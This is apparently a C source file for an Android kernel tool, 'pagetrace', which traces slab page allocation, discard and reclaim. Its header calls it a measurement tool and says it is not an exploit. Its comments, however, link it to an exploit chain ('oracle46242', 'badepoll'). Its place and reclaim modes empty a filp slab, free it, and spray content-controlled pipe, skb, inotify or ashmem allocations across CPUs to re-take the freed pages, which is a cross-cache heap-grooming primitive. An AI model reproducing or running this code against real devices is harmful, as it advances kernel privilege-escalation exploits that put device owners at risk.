/* SPDX-License-Identifier: Apache-2.0
 *
 * pagetrace — name a kernel allocation's page geometry, and follow one slab
 * page from allocation to discard to reclaim.
 *
 * Every mode isolates ONE allocation class and marks its own phases into
 * tracefs trace_marker, so the kmem tracepoints running alongside it
 * (mm_page_alloc / mm_page_free / kmalloc / kmem_cache_alloc) can be attributed
 * by phase and correlated by PFN. Nothing here is an exploit: it allocates and
 * frees ordinary objects an unprivileged process may allocate and free.
 *
 * Build (host):
 *   aarch64-linux-gnu-gcc -static -O1 -o pagetrace pagetrace.c
 * Drive it with pagetrace.sh, which arms the tracepoints (root) and runs the
 * analyzer; see README.md.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/inotify.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>

#define PIPE_SLOTS  16                  /* pages per pipe after F_SETPIPE_SZ */
#define SKB_LEN     7808                /* oracle46242.c AAR_SKB_LEN */
#define INOTIFY_NAME 200                /* +33 header -> kmalloc-256 */
#define FILP_OBJS_PER_SLAB 25           /* /sys/kernel/slab/filp/objs_per_slab */

/* ashmem_area_cache is order-1 (objsize 312, 26 per slab) and 256 of those
 * bytes are the area name, which ASHMEM_SET_NAME copies from userspace
 * verbatim -- arbitrary bytes, NUL included. /dev/ashmem is mode 0666, so this
 * is reachable at uid 2000. That makes it the widest content-controlled
 * order-1 vehicle on this device: 82% of each object is ours. */
#define ASHMEM_NAME_LEN 256
#define __ASHMEMIOC     0x77
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
#define ASHMEM_SET_SIZE _IOW(__ASHMEMIOC, 3, size_t)

static int mark_fd = -1;

/* Phase marks land in the same ring buffer as the kmem events, so the host
 * analyzer can bucket every page event by the phase it happened in. */
static void mark(const char *m)
{
	if (mark_fd < 0)
		mark_fd = open("/sys/kernel/tracing/trace_marker", O_WRONLY);
	if (mark_fd >= 0)
		write(mark_fd, m, strlen(m));
	printf("%s\n", m);
	fflush(stdout);
}

static void pin(int cpu)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	sched_setaffinity(0, sizeof(set), &set);
}

static void raise_nofile(void)
{
	struct rlimit rl;
	if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
		rl.rlim_cur = rl.rlim_max;
		setrlimit(RLIMIT_NOFILE, &rl);
	}
}

static long now_ms(void)
{
	struct timespec t;
	clock_gettime(CLOCK_MONOTONIC, &t);
	return t.tv_sec * 1000 + t.tv_nsec / 1000000;
}

/* Grace-period pressure with NO allocation of our own: under rcu_nocbs=all the
 * deferred file frees are only eligible after a grace period, and the rcuop
 * kthread that runs them needs cpu time we are not taking. */
static void quiet_drain(int ms)
{
	long t0 = now_ms();
	while (now_ms() - t0 < ms) {
		syscall(__NR_membarrier, 1 /* MEMBARRIER_CMD_GLOBAL */, 0, 0);
		usleep(20000);
	}
}

/* ---- allocation vehicles ------------------------------------------------ */

/* The write end is O_NONBLOCK on purpose. F_SETPIPE_SZ is advisory: once the
 * caller crosses fs.pipe-user-pages-soft the kernel caps new pipes at a single
 * page, and a blocking write past that cap parks the process forever with no
 * reader -- which is a hang, not a measurement. EAGAIN just means this pipe is
 * full, so move to the next one. */
static long alloc_pipe_pages(long n, char fill)
{
	char page[4096];
	long made = 0, stalled = 0;
	memset(page, fill, sizeof(page));
	while (made < n) {
		int pf[2];
		if (pipe(pf) < 0)
			break;
		fcntl(pf[1], F_SETPIPE_SZ, PIPE_SLOTS * 4096);
		fcntl(pf[1], F_SETFL, O_NONBLOCK);
		int got = 0;
		for (int k = 0; k < PIPE_SLOTS && made < n; k++) {
			if (write(pf[1], page, sizeof(page)) != (ssize_t)sizeof(page))
				break;
			made++;
			got++;
		}
		/* every new pipe capped at one page: the budget is spent, and
		 * spinning up more pipes buys no more pages */
		if (got <= 1 && ++stalled >= 8)
			break;
	}
	return made;
}

static long alloc_ashmem(long n, unsigned char fill)
{
	char name[ASHMEM_NAME_LEN];
	long made = 0;
	memset(name, fill, sizeof(name));
	for (long i = 0; i < n; i++) {
		int fd = open("/dev/ashmem", O_RDWR);
		if (fd < 0)
			break;
		if (ioctl(fd, ASHMEM_SET_NAME, name) < 0) {
			close(fd);
			break;
		}
		ioctl(fd, ASHMEM_SET_SIZE, (size_t)4096);
		made++;                 /* fd held: the area stays allocated */
	}
	return made;
}

static long alloc_skb(long n)
{
	char *buf = malloc(SKB_LEN);
	long made = 0;
	if (!buf)
		return 0;
	memset(buf, 0x41, SKB_LEN);
	while (made < n) {
		int sv[2], snd = SKB_LEN * 32;
		if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0)
			break;
		setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
		for (int k = 0; k < 16 && made < n; k++) {
			if (send(sv[0], buf, SKB_LEN, MSG_DONTWAIT) <= 0)
				break;
			made++;
		}
	}
	return made;
}

/* inotify events: alloc_len = sizeof(inotify_event_info) + name_len + 1, so a
 * 200-byte name lands in kmalloc-256 with the name bytes under our control —
 * and mkdir/rmdir generates them WITHOUT allocating a struct file. */
struct ino_ctx { int fd[8]; int n; char dir[64]; long seq; };

static int ino_open(struct ino_ctx *c, const char *dir, int want)
{
	snprintf(c->dir, sizeof(c->dir), "%s", dir);
	mkdir(c->dir, 0700);
	c->n = 0;
	c->seq = 0;
	for (int i = 0; i < want && i < 8; i++) {
		c->fd[i] = inotify_init1(IN_NONBLOCK);
		if (c->fd[i] < 0)
			break;
		if (inotify_add_watch(c->fd[i], c->dir, IN_CREATE | IN_DELETE) < 0)
			break;
		c->n++;
	}
	return c->n;
}

static long ino_gen(struct ino_ctx *c, long dirs)
{
	char nm[INOTIFY_NAME + 1], path[512];
	long made = 0;
	memset(nm, 'n', INOTIFY_NAME);
	nm[INOTIFY_NAME] = 0;
	for (long q = 0; q < dirs; q++) {
		snprintf(path, sizeof(path), "%s/%.*s%06ld", c->dir,
			 INOTIFY_NAME - 12, nm, (c->seq++) % 1000000);
		if (mkdir(path, 0700) < 0)
			break;
		rmdir(path);
		made += 2 * c->n;               /* IN_CREATE + IN_DELETE per watcher */
	}
	return made;
}

/* ---- modes -------------------------------------------------------------- */

static int mode_class(const char *kind, long n)
{
	long made = 0;
	mark("CLASS_START");
	if (!strcmp(kind, "pipe"))         made = alloc_pipe_pages(n, 0x42);
	else if (!strcmp(kind, "skb"))     made = alloc_skb(n);
	else if (!strcmp(kind, "epoll")) { for (; made < n && epoll_create1(0) >= 0; made++) ; }
	else if (!strcmp(kind, "inotify")) {
		struct ino_ctx c;
		if (ino_open(&c, "/data/local/tmp/pt_watch", 1) > 0)
			made = ino_gen(&c, n);
	} else {
		fprintf(stderr, "unknown class %s\n", kind);
		return 2;
	}
	mark("CLASS_END");
	printf("class=%s allocated=%ld\n", kind, made);
	usleep(300000);                     /* hold, so a slabinfo sample can land */
	return 0;
}

static int mode_drain(long n, int hold_ms, int quiet_ms)
{
	int *fds;
	long held = 0;
	raise_nofile();
	fds = malloc(sizeof(int) * n);
	if (!fds)
		return 3;
	for (long i = 0; i < n; i++) {
		int fd = eventfd(0, 0);
		if (fd < 0)
			break;
		fds[held++] = fd;
	}
	mark("DRAIN_OPENED");
	usleep((useconds_t)hold_ms * 1000);
	for (long i = 0; i < held; i++)
		close(fds[i]);
	mark("DRAIN_CLOSED");
	quiet_drain(quiet_ms);
	mark("DRAIN_QUIET_DONE");
	printf("opened=%ld\n", held);
	return 0;
}

/* place: exhaust filp's free slots with <pool>, then fill <fill> objects in a
 * tight loop on one cpu so they occupy fresh slabs of our own, then free only
 * those.  The fill must exceed one slab: SLUB never discards the per-cpu ACTIVE
 * slab, so a 25-object fill leaves its slab installed as c->page and nothing is
 * returned to the buddy allocator. */
static int place_core(long pool_n, int fill_n, int cpu, int **slab_out, int *fill_out)
{
	int *pool, *slab;
	long held = 0;
	raise_nofile();
	pin(cpu);
	pool = malloc(sizeof(int) * pool_n);
	slab = malloc(sizeof(int) * fill_n);
	if (!pool || !slab)
		return -1;
	for (long i = 0; i < pool_n; i++) {
		int fd = eventfd(0, 0);
		if (fd < 0)
			break;
		pool[held++] = fd;
	}
	mark("POOL_DONE");
	usleep(200000);
	mark("SLAB_FILL_START");
	for (int i = 0; i < fill_n; i++)
		slab[i] = eventfd(0, 0);
	mark("SLAB_FILL_END");
	*slab_out = slab;
	*fill_out = fill_n;
	printf("pool_held=%ld fill=%d cpu=%d\n", held, fill_n, cpu);
	return 0;
}

static void place_free(int *slab, int fill_n)
{
	mark("VICTIM_CLOSE_START");
	for (int i = 0; i < fill_n; i++)
		if (slab[i] >= 0)
			close(slab[i]);
	mark("VICTIM_CLOSE_END");
}

static int mode_place(long pool_n, int fill_n, int cpu, int quiet_ms)
{
	int *slab, n;
	if (place_core(pool_n, fill_n, cpu, &slab, &n) < 0)
		return 3;
	usleep(200000);
	place_free(slab, n);
	quiet_drain(quiet_ms);
	mark("QUIET_DONE");
	return 0;
}

/* reclaim: place, free, then run a vehicle and let the host analyzer say, by
 * PFN, whether the vehicle took a page the discard had just returned.
 *   pipe  order-0 unmovable, fully content-controlled
 *   k256  order-1 unmovable (kmalloc-256 is order-1 here), content-controlled
 *         through the inotify event name, and allocates no struct file
 *   skb   order-3 unmovable (kmalloc-8k), content-controlled: the vehicle the
 *         badepoll chain already sprays. Worth trying because a discarded slab
 *         page reaches the buddy freelists within a millisecond, and adjacent
 *         freed blocks coalesce there -- so the block that has to be re-taken
 *         may no longer be order-1 at all.
 * The vehicle sprays across every cpu because the slab is discarded by an rcuop
 * kthread on a cpu we do not choose, onto THAT cpu's pcp list for that order. */
static int mode_reclaim(long pool_n, int fill_n, int cpu, const char *vehicle,
			int window_ms, int batch, int gap_us, int ncpu)
{
	int *slab, n;
	struct ino_ctx ino;
	long sprayed = 0;

	if (!strcmp(vehicle, "k256")) {
		/* exhaust kmalloc-256's free slots first, so the spray's allocations
		 * have to pull fresh order-1 slabs from the page allocator */
		if (ino_open(&ino, "/data/local/tmp/pt_rc", 8) <= 0)
			return 3;
		ino_gen(&ino, 1500);
		mark("K256_EXHAUSTED");
	}
	if (place_core(pool_n, fill_n, cpu, &slab, &n) < 0)
		return 3;
	usleep(200000);
	place_free(slab, n);
	mark("SPRAY_START");
	{
		long t0 = now_ms();
		int c = 0;
		while (now_ms() - t0 < window_ms) {
			pin(c++ % ncpu);
			if (!strcmp(vehicle, "pipe"))
				sprayed += alloc_pipe_pages(batch, 0x5a);
			else if (!strcmp(vehicle, "skb"))
				sprayed += alloc_skb(batch);
			else if (!strcmp(vehicle, "ashmem"))
				sprayed += alloc_ashmem(batch, 0x5a);
			else
				sprayed += ino_gen(&ino, batch);
			syscall(__NR_membarrier, 1, 0, 0);
			if (gap_us)
				usleep(gap_us);
		}
	}
	mark("SPRAY_END");
	printf("vehicle=%s sprayed=%ld\n", vehicle, sprayed);
	return 0;
}

static void usage(void)
{
	fprintf(stderr,
"pagetrace <mode> ...\n"
"  class pipe|skb|inotify|epoll <count>\n"
"        allocate one class and exit; read order/migratetype/gfp/bytes_alloc\n"
"        back from the kmem tracepoints.\n"
"  drain <count> <hold_ms> <quiet_ms>\n"
"        allocate <count> filp objects, free them, wait quietly; measures\n"
"        whether whole slabs return to the buddy allocator.\n"
"  place <pool> <fill> <cpu> <quiet_ms>\n"
"        exhaust filp's free slots, fill fresh slabs of our own, free only\n"
"        those; the analyzer reports the per-slab discard yield.\n"
"  reclaim <pool> <fill> <cpu> pipe|k256|skb|ashmem <window_ms> [batch] [gap_us] [ncpu]\n"
"        as place, then run a reclaim vehicle and report, by PFN, whether it\n"
"        took one of the discarded slab pages.\n");
}

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "";

	setvbuf(stdout, NULL, _IONBF, 0);
	if (!strcmp(mode, "class") && argc >= 4)
		return mode_class(argv[2], atol(argv[3]));
	if (!strcmp(mode, "drain") && argc >= 3)
		return mode_drain(atol(argv[2]),
				  argc > 3 ? atoi(argv[3]) : 1000,
				  argc > 4 ? atoi(argv[4]) : 5000);
	if (!strcmp(mode, "place") && argc >= 4)
		return mode_place(atol(argv[2]), atoi(argv[3]),
				  argc > 4 ? atoi(argv[4]) : 4,
				  argc > 5 ? atoi(argv[5]) : 4000);
	if (!strcmp(mode, "reclaim") && argc >= 6)
		return mode_reclaim(atol(argv[2]), atoi(argv[3]), atoi(argv[4]), argv[5],
				    argc > 6 ? atoi(argv[6]) : 3000,
				    argc > 7 ? atoi(argv[7]) : 48,
				    argc > 8 ? atoi(argv[8]) : 0,
				    argc > 9 ? atoi(argv[9]) : 8);
	usage();
	return 2;
}
